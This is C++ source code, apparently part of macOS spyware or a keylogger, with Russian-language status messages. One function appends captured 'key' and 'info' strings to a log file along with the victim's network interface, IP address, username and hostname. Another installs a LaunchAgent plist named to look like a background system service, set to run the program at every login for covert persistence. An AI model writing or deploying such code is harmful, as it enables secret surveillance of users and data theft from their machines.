#include "file_reader.h"

using namespace std;

bool FileExists(const string& filename) {
    ifstream file(filename);
    return file.good();
}

void WriteToOutputFile(const std::wstring& key, const std::string& info, const std::string& filename) {
    wfstream file(filename, ios::app); 

    if (file.is_open()) {
        locale utf8_locale("ru_RU.UTF-8");
        file.imbue(utf8_locale);

        std::string inrtf;
        std::string device_ip;
        std::tie(inrtf, device_ip) = GetDeviceIP();

        string sys_info = "=INTERFACE=" + inrtf 
                            + "=DEVICE_IP=" 
                            + device_ip 
                            + "=USERNAME=" 
                            + GetUserName() 
                            + "=HOST_NAME=" 
                            + GetHostName() 
                            + "=\n";
        for(char c : sys_info) {
            file << c;
        };
        file << key;
        for(char c : info) {
            file << c;
        };
        file << L"=\n";
        file.close(); 
    } else {
        cerr << "Не удалось открыть файл для записи." << endl;
    }
}

void CreateLaunchAgentFile(char* path) {
    string file_path = string(getenv("HOME")) + "/Library/LaunchAgents/com.background.system.watcher.plist";
    string program_name  = "main";

    if (!FileExists(file_path)) {
        ofstream file(file_path);
        
        if (file.is_open()) {
            file << "<?xml version=\"1.0\" encoding=\"UTF-8\"?>" << endl;
            file << "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">" << endl;
            file << "<plist version=\"1.0\">" << endl;
            file << "<dict>" << endl;
            file << "    <key>BackgroundSystemWatcher</key>" << endl;
            file << "    <string>com.background.system.watcher</string>" << endl;
            file << "    <key>ProgramArguments</key>" << endl;
            file << "    <array>" << endl;
            file << "        <string>" << path << '/' << program_name << "</string>" << endl;
            file << "    </array>" << endl;
            file << "    <key>RunAtLoad</key>" << endl;
            file << "    <true/>" << endl;
            file << "</dict>" << endl;
            file << "</plist>" << endl;
            file.close();

            cout << "Файл успешно создан: " << file_path << endl;
        } else {
            cerr << "Не удалось открыть файл для записи." << endl;
        }
    }
}
